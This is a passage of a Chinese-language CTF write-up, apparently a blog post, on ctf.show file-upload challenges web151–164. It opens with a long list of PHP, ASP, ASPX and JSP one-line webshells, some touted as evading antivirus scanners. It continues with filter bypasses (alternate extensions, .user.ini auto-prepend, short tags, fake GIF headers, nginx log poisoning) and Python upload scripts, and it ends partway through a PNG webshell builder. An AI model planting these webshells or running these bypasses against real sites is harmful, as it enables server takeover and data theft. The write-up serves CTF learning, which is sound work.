variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//容错代码 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //绕过<span class="token php language-php"><span class="token delimiter important">&lt;?</span>限制的一句话<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> 无防下载表，有防下载表可尝试插入以下语句突破的一句话 &lt;%eval(request(“1″)):response.end%> 备份专用</code></pre><pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSP：&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; 提交客户端 &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;提交&quot;&gt;&lt;&#x2F;form&gt;</code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; &lt;%execute(request(“1″))%&gt; &lt;scriptrunat&#x3D;server&gt;execute request(“1″)&lt;&#x2F;script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 </code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##aspx&lt;scriptrunat&#x3D;”server”&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;&#x2F;script&gt; &lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; &lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</code></pre><h4 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h4><h5 id="大写绕过-或-同解析后缀名绕过"><a href="#大写绕过-或-同解析后缀名绕过" class="headerlink" title="大写绕过 或 同解析后缀名绕过"></a>大写绕过 或 同解析后缀名绕过</h5><pre class="language-txt" data-language="txt"><code class="language-txt">同解析名后缀：　　PHP：.php .php2 .php3 .php4 .php5 .php6 .php7 .php空格 .phtml .pgif　　　　 .shtml .htaccess .phar .inc 　　ASP：.asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem .soap　　　　 .vbhtm .vbhtml .asa .cer .shtml　　JSP：.jsp .jspx .jsw .jsv .sjspf .wss .do .action</code></pre><p>简单来说就是用各种姿势绕过服务器处理逻辑上传木马拿到WebShell</p><h3 id="web151-170"><a href="#web151-170" class="headerlink" title="web151-170"></a>web151-170</h3><h4 id="web151-Js前端限制"><a href="#web151-Js前端限制" class="headerlink" title="web151(Js前端限制)"></a>web151(Js前端限制)</h4><p>前端限制了只能上传png文件，可以抓包后修改文件后缀名</p><p><img src="web151.png" loading="lazy"></p><p>Payload：</p><blockquote><p>&#x2F;upload&#x2F;1.php</p><p>POST:attack&#x3D;system(‘tac ..&#x2F;flag.php’);</p></blockquote><h4 id="web152-MIME后端绕过"><a href="#web152-MIME后端绕过" class="headerlink" title="web152(MIME后端绕过)"></a>web152(MIME后端绕过)</h4><p>虽然后端简单检测，但是如果直接上传png,抓包的时候再改后缀，其实不用修改Content-Type，方法同上</p><p><strong>MIME</strong></p><p>MIME（Multipurpose Internal MailExtensions）多用途互联网邮件扩展类型。<br>是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动指定应用程序来打开。多用于来指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>每个MIME类型由两部分组成，前面是数据的大类型，例如声音audio，图像image等，后面定义具体的种类<br><strong>常见的MIME类型：</strong><br>超文本标记语言文本：.html——&gt;text&#x2F;html<br>xml文档：.xml——&gt;text&#x2F;xml<br>XHTML文档：.xhtml——&gt;application&#x2F;xhtml+xml<br>普通文本：.txt——&gt;text&#x2F;plain<br>RTF文本：.rtf——&gt;application&#x2F;rtf<br>png图片:.png——&gt;image&#x2F;png</p><p>这应该是预期解，有点麻烦</p><blockquote><p>上传一个php文件，同时用burp抓包，将burp中的Content-Type:<br>application&#x2F;octet-stream修改为Content-Type:<br>image&#x2F;png，即让服务器认为这个文件是一个图片文件去解析执行</p></blockquote><h4 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h4><p>常规姿势都试了发现没法绕过，发现upload可以访问，说明里面含有php文件可以考虑使用.user.ini绕过</p><p><strong>.user.ini</strong></p><ul><li>当前目录里面有php文件的时候，可以运用ini配置文件进行配置这个php文件</li><li>和文件包含有关的配置项有auto_append_file和auto_prepend_file</li></ul><p>原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php）类</p><p>似于在index.php中插入一句：require(.&#x2F;a.jpg);这两个设置的区别只是在于auto_prepend_file是在</p><p>文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当</p><p>前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.txt</span></code></pre><p>然后上传1.txt 这个1.txt木马就被自动包含进原来目录里的php文件了（一般是index.php）</p><p>Payload：&#x2F;upload?attack&#x3D;system(‘tac ..&#x2F;flag.php’);</p><h4 id="web154-PHP短标签"><a href="#web154-PHP短标签" class="headerlink" title="web154(PHP短标签)"></a>web154(PHP短标签)</h4><p>发现上传失败，应该是对txt文件里的内容有过滤经检测，查验之后发现是对<code>php</code>这三个字母过滤了</p><p>PHP标签绕过：</p><ul><li><p>长标签：<?php ?></p></li><li><p>短标签：<? ?>、<?=  ?>、&lt;%  %&gt;、&lt;%&#x3D;  %&gt;</p></li><li><p>其中 <?  ?> 需要开启 short_open_tag&#x3D;On ，&lt;%  %&gt; 需要开启 asp_tags&#x3D;On</p></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>自带 .user.ini，但不影响，payload 与 web154 一致</p><h4 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h4><p>过滤了<code>[]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web157-nginx文件包含"><a href="#web157-nginx文件包含" class="headerlink" title="web157(nginx文件包含)"></a>web157(nginx文件包含)</h4><p>过滤了<code>;``&#123;&#125;</code>，但是不影响，可以直接在1.txt里面执行命令</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fla<span class="token operator">*</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>其他：</p><p>由于我们 $_POST[] 只使用一个参数并且为数组格式，考虑使用 array_pop() 弹出最后一个单元</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>由web158的黑名单得来，#nginx 的日志会获取 UA头 信息#bp 抓包,在 UA头 进行注入</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/log/nginx/access.log'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h4><p>ban了log，可改为</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h4><p>ban了()，但是可以使用反引号直接执行命令，或者之前的nginx日志注入</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h4><p>空格，反引号被ban了</p><p>突破空格过滤可以用换行符%0a</p><p>可以继续日志注入或者php伪协议</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"ph"</span><span class="token operator">.</span><span class="token string double-quoted-string">"p://filter/convert.base64-encode/resource=../flag.p"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hp"</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web161-伪造图片头GIF89a"><a href="#web161-伪造图片头GIF89a" class="headerlink" title="web161(伪造图片头GIF89a)"></a>web161(伪造图片头GIF89a)</h4><p>增加了对图片头的识别，用了getimagesize()进行检测</p><p>getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p><p>ini问价和一句话木马前都要加一句GIF89a，或者改成png文件头89 50 4E 47</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web162-条件竞争-远程文件包含"><a href="#web162-条件竞争-远程文件包含" class="headerlink" title="web162(条件竞争 远程文件包含)"></a>web162(条件竞争 远程文件包含)</h4><p>内容ban了<code>.</code>之前方法就不行了，可以包含<code>/tmp/sess_&#123;sessid&#125;</code>进行条件竞争</p><p>也可以进行远程文件包含</p><ol><li><p>将木马上传至远程服务器，由于过滤了. 所以需要转换下，mm</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>或者<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>上传包含文件 .user.ini</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">txt</span></code></pre></li><li><p>上传远程调用文件 txt <a href="https://www.bejson.com/convert/ip2int/">IP转数字</a></p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"http://数字IP/mm"</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>访问upload</p></li></ol><p><strong>但是我在尝试的时候，总是返回400😅</strong></p><p>于是看到了另一个非预期，通过异或编码绕过这里不能直接用 python 的 urllib.parse.unquote 函数编码参数，需要自行写一个 int2byte </p><p>的函数，这里遇到个坑。</p><p>顺带用 python 实现了下 php 中对字符串的取反，其实就是 <code>255 - 字符的ascii</code> 得到的 ascii 取字符。于是就有了如下脚本。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"/var/log/nginx/access.log"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://f0c1c895-2920-42b8-8f40-cff4a3a610b3.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 &lt;?=system('tac ../fla*');?>"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h4><p>上传图片后，会被删除，所以需要在上传的瞬间，就post命令执行，还可以直接在配置文件里远程包含，然后访问&#x2F;upload&#x2F;index.php。</p><p>这样就不用即时去post了。（这个要求服务器开启了远程包含选项）</p><p>同样也可以使用上面脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"php://filter/convert.base64-encode/resource=/var/www/html/flag.php"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://ff4fcc76-8205-41ea-a4ba-52f257147647.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web164-png图片二次渲染"><a href="#web164-png图片二次渲染" class="headerlink" title="web164(png图片二次渲染)"></a>web164(png图片二次渲染)</h4><p>这一关考察png图片二次渲染，经过上传图片后再次将图片下载下来经过对比，使用010editor发现经过了二次渲染，很多地方的数据都</p><p>不一样了</p><blockquote><p>所谓二次渲染，就是网站将用户所上传的文件，由于各种原因（适配网站显示，防止木马）等，将文件中的数据进行修改，对二次渲</p><p>染的绕过即将源文件与上传之后的文件进行对比，找出没有发生变化的数据位置，将后门代码插入没有发生变化的数据的位置。对于</p><p>绕过二次渲染，人工绕过几乎不可能，这就需要使用脚本来进行构建图片马。</p></blockquote><p>某不知名佬写的代码,参考<a href="https://blog.csdn.net/qq_46918279/article/details/120575503">CTFSHOW-文件上传</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span 